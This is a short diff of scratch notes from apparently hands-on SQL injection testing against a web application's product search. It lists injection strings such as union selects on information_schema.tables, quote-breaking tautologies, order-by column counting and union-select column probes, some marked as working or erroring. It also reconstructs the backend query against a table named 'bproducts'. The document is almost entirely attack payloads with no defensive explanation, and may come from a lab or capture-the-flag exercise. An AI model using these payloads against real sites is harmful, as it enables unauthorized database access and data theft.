@@ -4,3 +4,45 @@
 
 
 1' union select * from information_schema.tables
+
+
+%a"+or"1"='1%--+
+
+%'+or"1"='1-- (works)
+
+
+'+union+select+1,2,3+or+"1"='1--- throws an error
+
+'or+"1"='1'+union+select+1,2,3+--+'% 
+
+
+'+order+by+20 
+
+
+'or+'3'--+
+
+
+possible queries reconstructed
+((select * from ___ where category like '%%' and bu is not null) order by category)
+
+
+((select * from bproducts where category like '%%' and bu is not null) order by category)
+
+
+((select * from bproducts where category like '%<>%' or pname like '%<>%' and bu is not null) order by category)
+
+
+' union select 1,2,'3
+
+
+((select * from bproducts where category like '%' union select 1,2,'3%' or pname like '%' union select 1,2,'3%' and bu is not null) order by category)
+
+
+
+'+union+select+1,2,'3','
+
+'+union+select+1,2,3,4,5,'
+
+
+
+
